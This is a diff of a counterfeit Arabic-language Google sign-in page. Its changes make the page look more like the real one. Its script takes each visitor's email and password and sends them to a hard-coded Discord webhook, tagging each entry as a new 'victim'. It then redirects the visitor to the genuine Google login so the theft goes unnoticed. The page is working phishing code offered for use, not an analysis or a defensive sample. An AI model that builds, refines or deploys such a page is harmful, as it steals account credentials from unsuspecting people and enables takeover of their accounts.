@@ -1,58 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول - Google</title>
+  <title>تسجيل الدخول - حساب Google</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
       background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
+      font-family: 'Roboto', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      direction: rtl;
     }
-    .login-box {
-      background-color: white;
-      padding: 40px;
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px 30px;
       border-radius: 8px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-      width: 300px;
+      box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
+      width: 360px;
       text-align: center;
     }
-    input {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
+
+    .login-container img {
+      width: 75px;
+      margin-bottom: 20px;
     }
-    button {
+
+    .login-container h2 {
+      margin-bottom: 10px;
+      font-size: 20px;
+      color: #202124;
+    }
+
+    .login-container input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+
+    .login-container button {
+      width: 100%;
+      padding: 12px;
       background-color: #1a73e8;
-      color: white;
       border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
       cursor: pointer;
+      font-size: 15px;
+      margin-top: 10px;
+    }
+
+    .login-container p {
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="login-box">
-    <h2>تسجيل الدخول إلى Google</h2>
+  <div class="login-container">
+    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Google Logo">
+    <h2>تسجيل الدخول إلى حسابك في Google</h2>
     <form onsubmit="sendToDiscord(); return false;">
-      <input type="text" id="email" placeholder="البريد الإلكتروني" required>
+      <input type="email" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
       <input type="password" id="password" placeholder="كلمة المرور" required>
       <button type="submit">التالي</button>
     </form>
+    <p>ليس جهاز الكمبيوتر هذا؟ استخدم وضع التصفح المتخفي لتسجيل الدخول.</p>
   </div>
 
   <script>
     function sendToDiscord() {
       var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
+
       var webhookURL = "https://discordapp.com/api/webhooks/1399397276287238214/7ewH5rbPYRfX4HW2o5ano6PG48nJvEO6YsQvjMc5hxP21cuKVz9wl-zhlyaE-CVJJk-J";
 
-      var content = {
-        content: `📥 ضحية جديدة:\n📧 Email: ${email}\n🔑 Password: ${password}`
+      var payload = {
+        content: `📥 ضحية جديدة على صفحة Google وهمية:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`
       };
 
       fetch(webhookURL, {
@@ -60,9 +94,11 @@
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify(content)
+        body: JSON.stringify(payload)
       }).then(() => {
-        window.location.href = "https://accounts.google.com";
+        window.location.href = "https://accounts.google.com/";
+      }).catch(err => {
+        alert("حدث خطأ أثناء الإرسال.");
       });
     }
   </script>
